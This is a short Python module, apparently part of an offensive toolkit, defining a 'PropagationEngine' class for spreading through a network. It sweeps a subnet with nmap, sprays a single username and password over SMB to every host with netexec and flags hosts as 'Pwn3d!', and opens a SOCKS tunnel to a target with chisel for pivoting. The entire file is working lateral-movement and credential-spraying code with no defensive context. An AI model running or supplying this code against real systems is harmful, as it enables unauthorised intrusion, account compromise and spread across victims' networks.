import subprocess
import logging
from typing import Any

logger = logging.getLogger("propagation_engine")


class PropagationEngine:
    def __init__(self) -> None:
        self.results: dict[str, Any] = {}

    def scan_subnet(self, subnet: str, ports: str = "22,80,443,445,3389") -> list[dict]:
        logger.info(f"Scanning subnet {subnet} ports {ports}")
        try:
            r = subprocess.run(
                ["nmap", "-sn", "-T4", subnet, "-oG", "-"],
                capture_output=True, timeout=120, text=True,
            )
            hosts = []
            for line in r.stdout.splitlines():
                if "Host:" in line and "Status: Up" in line:
                    parts = line.split()
                    ip = parts[1] if len(parts) > 1 else ""
                    hosts.append({"ip": ip, "status": "up"})
            return hosts
        except FileNotFoundError:
            logger.warning("nmap not found, using fallback")
            return [{"ip": subnet, "status": "unknown"}]
        except subprocess.TimeoutExpired:
            logger.error(f"nmap scan timed out on {subnet}")
            return []

    def spray_creds(self, hosts: list[str], username: str, password: str) -> list[dict]:
        results = []
        for host in hosts:
            try:
                r = subprocess.run(
                    ["netexec", "smb", host, "-u", username, "-p", password],
                    capture_output=True, timeout=30, text=True,
                )
                results.append({
                    "host": host,
                    "success": "[+]" in r.stdout or "(Pwn3d!)" in r.stdout,
                    "output": r.stdout.strip(),
                })
            except (FileNotFoundError, subprocess.TimeoutExpired) as e:
                results.append({"host": host, "success": False, "error": str(e)})
        return results

    def deploy_tunnel(self, target_ip: str, lport: int = 1080) -> dict:
        try:
            r = subprocess.run(
                ["chisel", "client", f"{target_ip}:{lport}", "socks"],
                capture_output=True, timeout=15, text=True,
            )
            return {"success": r.returncode == 0, "output": r.stdout.strip()}
        except (FileNotFoundError, subprocess.TimeoutExpired) as e:
            return {"success": False, "error": str(e)}
